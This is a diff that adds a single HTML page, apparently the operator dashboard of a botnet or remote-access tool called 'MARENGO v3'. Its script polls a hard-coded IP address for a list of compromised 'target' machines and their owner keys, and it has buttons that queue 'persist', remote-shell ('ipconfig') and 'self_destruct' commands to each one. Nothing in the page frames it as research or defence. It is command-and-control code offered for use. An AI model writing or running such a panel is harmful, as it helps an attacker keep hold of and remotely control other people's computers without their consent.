@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>MARENGO v3 | Global Command</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #0f0f0f; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
+        .card { background: #1a1a1a; border: 1px solid #00ff41; margin-bottom: 20px; }
+        .btn-ghost { border: 1px solid #00ff41; color: #00ff41; background: transparent; transition: 0.3s; }
+        .btn-ghost:hover { background: #00ff41; color: #000; }
+        .status-online { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
+        .terminal { background: #000; height: 200px; overflow-y: scroll; padding: 10px; border: 1px solid #333; }
+    </style>
+</head>
+<body class="p-4">
+
+    <div class="container-fluid">
+        <header class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
+            <h2>MARENGO // DASHBOARD_V3</h2>
+            <div id="connection-status">📡 CONNECTED TO BRAIN</div>
+        </header>
+
+        <div class="row">
+            <div class="col-md-8">
+                <div class="card p-3">
+                    <h4>Active Orbital Nodes</h4>
+                    <table class="table table-dark table-hover mt-3">
+                        <thead>
+                            <tr>
+                                <th>Target ID</th>
+                                <th>Owner Key</th>
+                                <th>Last Seen</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="node-table">
+                            </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="col-md-4">
+                <div class="card p-3">
+                    <h4>System Logs</h4>
+                    <div id="log-window" class="terminal small"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BRAIN_API = "http://18.184.135.220:9000/api";
+
+        function addLog(msg) {
+            const logWin = document.getElementById('log-window');
+            logWin.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+            logWin.scrollTop = logWin.scrollHeight;
+        }
+
+        async function fetchNodes() {
+            try {
+                const response = await fetch(`${BRAIN_API}/nodes`);
+                const nodes = await response.json();
+                const tableBody = document.getElementById('node-table');
+                tableBody.innerHTML = "";
+
+                for (const [id, key] of Object.entries(nodes)) {
+                    tableBody.innerHTML += `
+                        <tr>
+                            <td class="status-online">${id}</td>
+                            <td>${key}</td>
+                            <td>Active Now</td>
+                            <td>
+                                <button class="btn btn-sm btn-ghost" onclick="sendCommand('${id}', 'persist')">PERSIST</button>
+                                <button class="btn btn-sm btn-ghost" onclick="sendCommand('${id}', 'ipconfig')">SHELL</button>
+                                <button class="btn btn-sm btn-danger btn-sm" onclick="sendCommand('${id}', 'self_destruct')">X</button>
+                            </td>
+                        </tr>
+                    `;
+                }
+            } catch (e) {
+                addLog("API Error: Unable to reach Brain.");
+            }
+        }
+
+        async function sendCommand(id, cmd) {
+            addLog(`Sending ${cmd} to ${id}...`);
+            await fetch(`${BRAIN_API}/command?id=${id}&cmd=${cmd}`, { method: 'POST' });
+            addLog(`Command Queued.`);
+        }
+
+        // Auto-refresh every 5 seconds
+        setInterval(fetchNodes, 5000);
+        fetchNodes();
+    </script>
+</body>
+</html>
